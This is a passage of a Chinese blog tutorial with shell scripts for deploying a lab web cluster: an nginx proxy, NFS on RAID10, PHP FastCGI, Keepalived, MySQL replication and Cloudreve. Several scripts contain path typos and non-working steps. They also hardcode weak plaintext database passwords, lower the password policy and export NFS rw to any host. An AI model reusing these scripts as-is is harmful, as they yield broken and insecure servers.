--with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line">cd /usr/local/nginx/conf/</span><br><span class="line">cp nginx.conf nginx.conf.bak</span><br><span class="line"></span><br><span class="line">mkdir -p /usr/local/nginx/conf/user</span><br><span class="line">cat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt; EOF</span><br><span class="line">user nobody;</span><br><span class="line">worker_processes auto;</span><br><span class="line"></span><br><span class="line">worker_cpu_affinity 0001;</span><br><span class="line">worker_rlimit_nofile 50000;</span><br><span class="line"></span><br><span class="line">error_log /usr/local/nginx/logs/error.log warn;</span><br><span class="line">pid /usr/local/nginx/logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events {</span><br><span class="line">    worker_connections 50000;</span><br><span class="line">    use epoll;</span><br><span class="line">    multi_accept on;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http {</span><br><span class="line">    include mime.types;</span><br><span class="line">    default_type application/octet-stream;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">    </span><br><span class="line">    access_log /usr/local/nginx/logs/access.log main;</span><br><span class="line">    sendfile on;</span><br><span class="line">    tcp_nopush on;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    </span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 2K;</span><br><span class="line">    gzip_buffers 4 16k;</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    gzip_types text/plain application/x-javascript text/css application/xml;</span><br><span class="line">    </span><br><span class="line">    upstream webServer {</span><br><span class="line">        server 192.168.110.13:80 weight=1 max_fails=3 fail_timeout=10s;</span><br><span class="line">        server 192.168.110.14:80 weight=1 max_fails=3 fail_timeout=10s;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    include /user/local/nginx/conf/user/*.conf;</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOF</span><br><span class="line">server {</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.uplookinglinux.com;</span><br><span class="line"></span><br><span class="line">    charset utf-8;</span><br><span class="line">    access_log /usr/local/nginx/logs/proxy.access.log main;</span><br><span class="line"></span><br><span class="line">    location / {</span><br><span class="line">        root /var/www/web;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line">        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;</span><br><span class="line">        proxy_pass http://webServer;</span><br><span class="line"></span><br><span class="line">        #&#x4F20;&#x9012;&#x5BA2;&#x6237;&#x7684;ip&#x4FE1;&#x606F;&#x7ED9;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668; &#x5728;&#x540E;&#x53F0;&#x670D;&#x52A1;&#x901A;&#x8FC7;&#x53C2;&#x6570;$http_x_real_ip&#x53D6;&#x5F97;&#x8BE5;&#x4F20;&#x9012;&#x7684;IP&#x4FE1;&#x606F;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_connect_timeout 30;</span><br><span class="line">        proxy_send_timeout 15;</span><br><span class="line">        proxy_read_timeout 15;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &#x5B89;&#x88C5;RAID&#x7BA1;&#x7406;&#x5DE5;&#x5177;</span></span><br><span class="line">yum install -y mdadm</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x521B;&#x5EFA;RAID10</span></span><br><span class="line">mdadm -Cv /dev/md10 -a yes -l 10 -n 4 /dev/sd[b-e]</span><br><span class="line">mdadm -Q /dev/md10</span><br><span class="line">mdadm -q /dev/md10</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5236;&#x4F5C;LVM&#x5206;&#x533A;</span></span><br><span class="line">pvcreate /dev/md10</span><br><span class="line">vgcreate webData /dev/md10</span><br><span class="line">lvcreate -n lv_web -L 20G webData</span><br><span class="line">mkfs.xfs /dev/webData/lv_web</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6302;&#x8F7D;&#x78C1;&#x76D8;</span></span><br><span class="line">mkdir /webData</span><br><span class="line">echo -e &quot;/dev/webData/lv_web\t/webData\t xfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstab</span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x914D;&#x7F6E;NFS Server</span></span><br><span class="line">yum install -y rpcbind nfs-utils</span><br><span class="line">systemctl start rpcbind &amp;&gt; /dev/null</span><br><span class="line">systemctl enable rpcbind &amp;&gt; /dev/null</span><br><span class="line">systemctl status rpcbind</span><br><span class="line"></span><br><span class="line">echo -e &quot;/webData *(rw,sync,all_squash,anonuid=99,anongid=99)&quot; &gt; /etc/exports</span><br><span class="line"></span><br><span class="line">systemctl start nfs</span><br><span class="line">systemctl status nfs</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;PHP-FastCGI"><a href="#&#x914D;&#x7F6E;PHP-FastCGI" class="headerlink" title="&#x914D;&#x7F6E;PHP FastCGI"></a>&#x914D;&#x7F6E;PHP FastCGI</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> filename : php-config.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x914D;&#x7F6E;PHP</span></span><br><span class="line">cd /usr/local/src/</span><br><span class="line">curl -O --progress http://192.168.110.3/src/php5.6_auto_install.tar.gz</span><br><span class="line">tar zxf php5.6_auto_install.tar.gz</span><br><span class="line">cd php5.6/</span><br><span class="line">chmod a+x install.sh</span><br><span class="line">. ./install.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x521B;&#x5EFA;&#x7AD9;&#x70B9;&#x76EE;&#x5F55;</span></span><br><span class="line">mkdir -p /var/www/web</span><br><span class="line">echo -e &quot;&lt;?php\n\tphpinfo();\n?&gt;&quot; &gt; /var/www/web/index.php</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"><a href="#&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI" class="headerlink" title="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"></a>&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> filename : ngxin-fastcgi.sh</span></span><br><span class="line"></span><br><span class="line">cat &gt;&gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOF</span><br><span class="line">upstream phpServer {</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6307;&#x5B9A;&#x8D1F;&#x8F7D;&#x7B97;&#x6CD5;&#xFF1A;&#x7279;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7531;&#x56FA;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#x670D;&#x52A1;&#xFF0C;&#x89E3;&#x51B3;session&#x5171;&#x4EAB;&#x95EE;&#x9898;</span></span><br><span class="line">ip_hash;</span><br><span class="line">server 192.168.110.15:9000 max_fails=3 fail_timeout=10s;</span><br><span class="line">server 192.168.110.16:9000 max_fails=3 fail_timeout=10s;</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOF</span><br><span class="line">fastcgi_connect_timeout 30;</span><br><span class="line">fastcgi_send_timeout 30;</span><br><span class="line">fastcgi_read_timeout 30;</span><br><span class="line">fastcgi_buffer_size 64k;</span><br><span class="line">fastcgi_busy_buffers_size 128k;</span><br><span class="line">fastcgi_temp_file_write_size 128k;</span><br><span class="line">location ~ \.(php|php5)$ {</span><br><span class="line">root /var/www/web;</span><br><span class="line"><span class="meta">#</span><span class="bash">&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;phpServer&#x96C6;&#x7FA4;</span></span><br><span class="line">fastcgi_pass phpServer;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">nginx -t</span><br><span class="line">nginx -s reload</span><br></pre></td></tr></tbody></table></figure><h2 id="Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"><a href="#Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived" class="headerlink" title="Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"></a>Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo -e &quot;192.168.110.11\tserver11\n192.168.110.12\tserver12&quot; &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5B89;&#x88C5;Keepalived</span></span><br><span class="line">yum install -y keepalived</span><br><span class="line"></span><br><span class="line">mv -f /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confback</span><br><span class="line">cat &gt; /etc/keepaliaved/keepalived.conf &lt;&lt; EOF</span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"> </span><br><span class="line">global_defs {</span><br><span class="line">    notification_email {</span><br><span class="line">        fnaichu@qq.com</span><br><span class="line">    }</span><br><span class="line">    notification_email_from keepalvied@proxy-1</span><br><span class="line">    smtp_server 127.0.0.1</span><br><span class="line">    smtp_connect_timeout 30</span><br><span class="line">    router_id proxy-1</span><br><span class="line">    vrrp_mcast_group4 224.4.4.4</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">vrrp_script chk_proxy {</span><br><span class="line">    script &quot;/etc/keepalived/proxy_check.sh&quot;</span><br><span class="line">     </span><br><span class="line">    interval 2</span><br><span class="line">     </span><br><span class="line">    weight -2</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">vrrp_instance VI_1 {</span><br><span class="line">    state BACKUP</span><br><span class="line">     </span><br><span class="line">    nopreempt</span><br><span class="line">     </span><br><span class="line">    virtual_router_id 11</span><br><span class="line">     </span><br><span class="line">    priority 100</span><br><span class="line">     </span><br><span class="line">    advert_int 1</span><br><span class="line">     </span><br><span class="line">    interface ens33</span><br><span class="line">     </span><br><span class="line">    authentication {</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    }</span><br><span class="line">    virtual_ipaddress {</span><br><span class="line">        192.168.110.10/24 dev ens33 label ens33:1</span><br><span class="line">    }</span><br><span class="line">    track_script {</span><br><span class="line">        chk_proxy</span><br><span class="line">    }</span><br><span class="line">    smtp_alert</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4EE3;&#x7406;&#x68C0;&#x6D4B;&#x811A;&#x672C;</span></span><br><span class="line">cat &gt; /etc/keepaliaved/proxy_check.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">netstat -nlpt | grep -w &quot;80&quot; &amp;&gt;&gt; /dev/null</span><br><span class="line"></span><br><span class="line">if [ $? -ne 0 ]</span><br><span class="line">then</span><br><span class="line">systemctl stop keepalived</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit 0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">chmod +x /etc/keepalived/proxy_check.sh</span><br><span class="line"></span><br><span class="line">systemctl start keepalived</span><br><span class="line">systemctl enable keepalived</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;MySQL"><a href="#&#x914D;&#x7F6E;MySQL" class="headerlink" title="&#x914D;&#x7F6E;MySQL"></a>&#x914D;&#x7F6E;MySQL</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">yum remove -y mariadb-libs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5B89;&#x88C5;MySQL</span></span><br><span class="line">rpm -ivh http://192.168.110.3/other/mysql-community-common-5.7.24-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh http://192.168.110.3/other/mysql-community-libs-5.7.24-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh http://192.168.110.3/other/mysql-community-client-5.7.24-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh http://192.168.110.3/other/mysql-community-server-5.7.24-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh http://192.168.110.3/other/mysql-community-libs-compat-5.7.32-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">systemctl start mysqld</span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl <span class="built_in">enable</span> mysqld</span></span><br><span class="line">systemctl status mysqld</span><br><span class="line"></span><br><span class="line">echo &quot;skip-name-resolve&quot; &gt;&gt; /etc/my.cnf</span><br><span class="line">grep &quot;temporary password&quot; /var/log/mysqld.log | awk &apos;{ print $NF }&apos;</span><br><span class="line"></span><br><span class="line">echo &quot;&#x4E0A;&#x9762;&#x662F;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&#x8BF7;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> show global variables like <span class="string">&quot;%password%&quot;</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> global validate_password_length=6;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> global validate_password_policy=LOW;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ALTER USER <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> IDENTIFIED BY <span class="string">&apos;ccc.456&apos;</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> FLUSH PRIVILEGES;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"><a href="#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;" class="headerlink" title="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"></a>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">mysql_replica.sh</span></span><br><span class="line">mysql -uroot -p&quot;ccc.456&quot;</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* TO &apos;root&apos;@&apos;192.168.110.%&apos; IDENTIFIED BY &apos;ccc.456&apos;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; /etc/my.cnf &lt;&lt;EOF</span><br><span class="line">server-id=1</span><br><span class="line">log_bin=mysql-bin</span><br><span class="line">query_cache_type=OFF</span><br><span class="line">binlog-ignore-db=performance_schema</span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line">binlog-ignore-db=sys</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">systemctl restart mysqld</span><br></pre></td></tr></tbody></table></figure><h3 id="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"><a href="#MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;" class="headerlink" title="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"></a>MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;192.168.110.18\tserver18\n192.168.110.19\tserver19\n&quot; &gt;&gt; /etc/hosts</span><br><span class="line"></span><br><span class="line">yum install -y keepalived</span><br><span class="line"></span><br><span class="line">mv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbak</span><br><span class="line"><span class="meta">#</span><span class="bash"> KeepAlived</span></span><br><span class="line">cat &gt; /etc/keepalived/keepalived.conf &lt;&lt; EOF</span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"> </span><br><span class="line">global_defs {</span><br><span class="line">    notification_email {</span><br><span class="line">        Jaking@vip.163.com</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    notification_email_from keepalived@server18</span><br><span class="line">    smtp_server 127.0.0.1</span><br><span class="line">    smtp_connect_timeout 30</span><br><span class="line">    router_id server18</span><br><span class="line">    vrrp_mcast_group5 225.5.5.5</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">    vrrp_script chk_proxy {</span><br><span class="line">        script &quot;/etc/keepalived/proxy_check.sh&quot;</span><br><span class="line">        interval 2</span><br><span class="line">        weight -2</span><br><span class="line">    }</span><br><span class="line">     </span><br><span class="line">    vrrp_instance VI_1 {</span><br><span class="line">    state BACKUP</span><br><span class="line">    nopreempt</span><br><span class="line">    virtual_router_id 11</span><br><span class="line">    priority 100</span><br><span class="line">    advert_int 1</span><br><span class="line">    interface ens33</span><br><span class="line">    </span><br><span class="line">    authentication {</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    virtual_ipaddress {</span><br><span class="line">        192.168.110.20/24 dev ens33 label ens33:1</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    track_script {</span><br><span class="line">        chk_proxy</span><br><span class="line">    }</span><br><span class="line">    smtp_alert</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/keepalived/proxy_check.sh &lt;&lt;EOF</span><br><span class="line">echo &gt; /etc/keepalived/proxy_check.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">netstat -nlpt | grep -w &quot;3306&quot; &amp;&gt;&gt; /dev/null</span><br><span class="line"> </span><br><span class="line">if [ $? -ne 0 ]</span><br><span class="line">then</span><br><span class="line">    systemctl stop keepalived</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit 0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">chmod a+x /etc/keepalived/proxy_check.sh</span><br><span class="line">systemctl restart keepalived</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"><a href="#&#x9879;&#x76EE;&#x4E0A;&#x7EBF;" class="headerlink" title="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"></a>&#x9879;&#x76EE;&#x4E0A;&#x7EBF;</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install -y unzip</span><br><span class="line">unzip Cloudreve_v1.0.3&#x4E91;&#x76D8;.zip</span><br><span class="line"></span><br><span class="line">ssh root@192.168.110.18 &quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;create database cloud;&apos;&quot;</span><br><span class="line">sql_user=&quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;GRANT ALL ON cloud.* TO &quot;abc&quot;@&quot;192.168.110.%&quot; IDENTIFIED BY &quot;Abc.abc.1&quot;;&apos;&quot;</span><br><span class="line">ssh root@192.168.110.18 &quot;$sql_user&quot;</span><br><span class="line"></span><br><span class="line">chown -R nobody:nobody /webData/</span><br><span class="line">chmod u+w /webData/runtime/</span><br><span class="line">chmod u+w /webData/public/</span><br><span class="line"></span><br><span class="line">cp /webData/application/database_sample.php /webData/application/database.php</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"><a href="#&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;" class="headerlink" title="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"></a>&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;</h3><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 